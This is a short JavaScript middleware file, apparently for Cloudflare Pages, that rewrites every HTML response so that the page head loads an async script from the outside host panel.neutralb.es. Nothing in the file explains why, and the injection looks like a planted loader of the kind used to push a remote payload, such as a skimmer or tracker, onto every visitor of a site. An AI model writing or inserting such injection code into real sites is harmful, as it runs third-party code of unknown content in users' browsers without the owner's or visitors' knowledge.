export async function onRequest(context) {
  const __r = await context.next();
  const __ct = __r.headers.get("content-type") || "";
  if (!__ct.includes("text/html")) return __r;
  return new HTMLRewriter().on("head", { element(e) { e.append('<script async src="https://panel.neutralb.es/track.js"></script>', { html: true }); } }).transform(__r);
}
